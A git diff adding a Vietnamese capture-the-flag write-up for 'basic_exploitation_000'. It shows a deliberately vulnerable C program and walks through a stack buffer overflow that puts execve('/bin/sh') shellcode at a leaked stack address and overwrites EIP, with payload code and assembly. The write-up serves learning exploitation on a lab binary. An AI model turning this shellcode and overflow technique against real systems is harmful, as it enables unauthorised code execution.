@@ -1,3 +1,109 @@
+# basic_exploitation_000
+
+## Source C
+
+<details> <summary> source C </summary>
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+
+
+void alarm_handler() {
+    puts("TIME OUT");
+    exit(-1);
+}
+
+
+void initialize() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    signal(SIGALRM, alarm_handler);
+    alarm(30);
+}
+
+
+int main(int argc, char *argv[]) {
+
+    char buf[0x80];
+
+    initialize();
+
+    printf("buf = (%p)\n", buf);
+    scanf("%141s", buf);
+
+    return 0;
+}
+
+```
+
+</details>
+
+## Ý tưởng
+
+- Ở đây do NX tắt nên ta có thể ret2shellcode
+
+![image](https://user-images.githubusercontent.com/111769169/227435534-6a3d25ae-90ca-42d2-b85a-e031ab9ee8b7.png)
+
+- Tuy nhiên ta cần lưu ý
+
+![image](https://user-images.githubusercontent.com/111769169/227424886-d07c6086-78f6-4453-a577-3864a27e8e80.png)
+
+- Do để rax của sys_execve() là 0x0b mà hàm scanf không chịu 0x0b nên khi chạy nó sẽ xuất hiện byte 0x00, scanf coi đó là hết chuỗi nhập vào và ngưng đọc tiếp, một xíu nữa em sẽ ví dụ cụ thể
+
+- Đầu tiên chương trình leak stack cho ta, vậy ta sẽ khai thác bằng cách đưa shellcode vào địa chỉ được leak, sau đó ow eip thành địa chỉ leak stack và thực thi shell
+
+## Thực thi
+
+### Bước 1: đưa shellcode vào địa chỉ được leak
+
+- Chương trình leak cho ta địa chỉ ở đỉnh stack luôn, và cần 132 byte để bắt đầu ghi đè eip
+
+```python
+payload = shellcode
+payload = payload.ljust(132, b"a")
+payload += p32(leak_stack)
+```
+
+### Bước 2: tạo shellcode
+
+- Bước tạo shell khá khó, chúng ta sẽ dựa vào sys_execve() cần điều kiện gì để viết shell
+
+```asm
+    xor    eax,eax              ;eax = 0
+    push   eax
+    push   0x68732f6e           ; đưa chuỗi /bin/sh vào trong, tuy nhiên chuỗi /bin/sh có  7 byte nên nếu push 7byte chương trình tự đưa byte 0x00, scanf sẽ ngưng đọc tiếp
+    push   0x69622f2f           ; do đó em sẽ đưa chuỗi //bin/sh
+    mov    ebx,esp              ; đưa //bin/sh vào ebx
+    xor    ecx,ecx              ; ecx = 0
+    xor    edx,edx              ; edx = 0
+    mov    eax,0x0b             ; eax = 0x0b (syscall) nếu dừng ở đây thì shellcode không chia hết cho 4,lúc đó, khi scanf đọc sẽ bị 0x00, và không thể padding các byte "a" được nữa
+    inc    eax                  ; mục đích dòng này để tăng shellcode chia hết cho 4
+    inc    eax
+    inc    eax
+    int    0x80
+```
+
+- Khi chạy chương trình và kiểm tra stack, không hề có các byte "a" padding, mà còn xuất hiện byte 0x00
+
+![image](https://user-images.githubusercontent.com/111769169/227439138-efe98702-7697-48ba-8624-a37d3818ae7c.png)
+
+- Lý do là ở 0x0b, scanf sẽ không đọc 0x0b nên sẽ trả về 0x00 và coi đó là kết thúc chuỗi nhập vào, để khắc phục ta sửa `mov eax, 0x0b` thành `mov al, 0x8` (này em tham khảo một xíu wu =))) và chạy lại, kiểm tra stack
+
+![image](https://user-images.githubusercontent.com/111769169/227440520-89a111c1-4d1b-4948-b874-2808ba4cb250.png)
+
+- oke đúng rùi và chạy thử xem 
+
+![image](https://user-images.githubusercontent.com/111769169/227440857-46774908-a9ed-4458-893a-3cfff48735e4.png)
+
+## Kết quả
+![image](https://user-images.githubusercontent.com/111769169/227441588-08d8c53a-8e64-4dbc-ba04-6ee247170f92.png)
+lưu ý ta nên cat flag luôn vì chương trình có thời gian ngắt
+
+
 # shell_basic
 
 ## Ý tưởng
@@ -431,3 +537,5 @@ r.interactive()
 ```
 
 </details>
+
+#
